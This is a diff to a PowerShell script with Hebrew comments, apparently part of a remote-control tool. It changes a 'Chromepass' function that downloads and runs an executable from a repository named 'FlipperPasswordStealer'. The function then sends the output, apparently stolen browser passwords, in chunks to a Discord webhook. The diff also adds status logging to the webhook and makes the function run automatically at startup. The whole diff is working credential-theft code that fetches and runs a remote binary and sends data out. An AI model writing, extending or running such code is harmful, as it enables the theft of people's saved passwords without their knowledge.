@@ -784,23 +784,75 @@ param ([int[]]$t)
 
 # --------------------------------------------------------------- CHROMEPASS FUNCTION ------------------------------------------------------------------------
 
-function Chromepass {
-    # Set webhook URL
-    $webhookUrl = 'https://discord.com/api/webhooks/1296149599156703366/FKW6CjNR0Tm-CBaBtWT5f-xN9TPDq6hVJlrseuVLAXKa-iRl2gD28HKhcx-1_e2Dr02n'
+# הגדרת URL של ה-Webhook של דיסקורד
+$webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
 
-    # URL and path for the executable
+# פונקציה לשליחת הודעות ל-Webhook של דיסקורד
+function Send-LogToDiscord {
+    param (
+        [string]$message
+    )
+
+    # מבנה ההודעה לדיסקורד
+    $payload = @{
+        "content" = $message
+        "username" = "$env:COMPUTERNAME Log Bot"
+    } | ConvertTo-Json
+
+    # שליחת ההודעה ל-Webhook
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+    } catch {
+        Write-Host "Failed to send log to Discord: $_"
+    }
+}
+
+# פונקציה כללית להוספת לוג ושיגורו ל-Webhook
+function Log-Message {
+    param (
+        [string]$message
+    )
+
+    # יצירת חותמת זמן להודעה
+    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+    $logEntry = "$timestamp - $message"
+    
+    # שליחת הלוג ל-Webhook בדיסקורד
+    Send-LogToDiscord $logEntry
+
+    # הצגת הלוג גם במסוף (אופציונלי)
+    Write-Host $logEntry
+}
+
+# פונקציית Chromepass הכוללת שליחת לוגים ל-Webhook
+function Chromepass {
+    Log-Message "Running Chromepass function..."
+    Log-Message "Attempting to download executable..."
+
+    # URL והגדרות להורדה והפעלת הקובץ
     $exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe'
     $exePath = ".\chrome.exe"
 
-    # Download executable if not present
     if (-not (Test-Path -Path $exePath)) {
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+        try {
+            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+            Log-Message "Download completed successfully."
+        } catch {
+            Log-Message "Failed to download executable: $_"
+            return
+        }
     }
 
-    # Run the executable and capture output
-    $commandOutput = & $exePath | Out-String
+    # הפעלת הקובץ ושמירת הפלט
+    try {
+        $commandOutput = & $exePath | Out-String
+        Log-Message "Executable ran successfully."
+    } catch {
+        Log-Message "Failed to run executable: $_"
+        return
+    }
 
-    # Divide output into chunks of 2000 characters for Discord webhook
+    # חלוקת הפלט לקטעים ושליחתו ל-Webhook בדיסקורד
     $chunkSize = 2000
     $chunks = [Math]::Ceiling($commandOutput.Length / $chunkSize)
     for ($i = 0; $i -lt $chunks; $i++) {
@@ -808,23 +860,17 @@ function Chromepass {
         $length = [Math]::Min($chunkSize, $commandOutput.Length - $start)
         $content = $commandOutput.Substring($start, $length)
 
-        # Prepare content for webhook
-        $webhookContent = @{
-            username = 'Flipper'
-            content = $content
-        }
-
-        # Convert to JSON and send to webhook
-        $jsonData = $webhookContent | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json'
-
-        # Delay to prevent rate limiting
-        Start-Sleep -Seconds 1
+        # שליחת הפלט בקטעים ל-Webhook בדיסקורד
+        Send-LogToDiscord $content
+        Start-Sleep -Seconds 1  # הפסקה כדי להימנע ממגבלות קצב של דיסקורד
     }
+
+    Log-Message "Chromepass function completed."
 }
 
-# Call Chromepass function where appropriate
-# Ensure it is triggered based on message or main loop logic
+# הפעלת Chromepass באופן אוטומטי בתחילת הסקריפט
+Chromepass
+
 
 
 # --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------
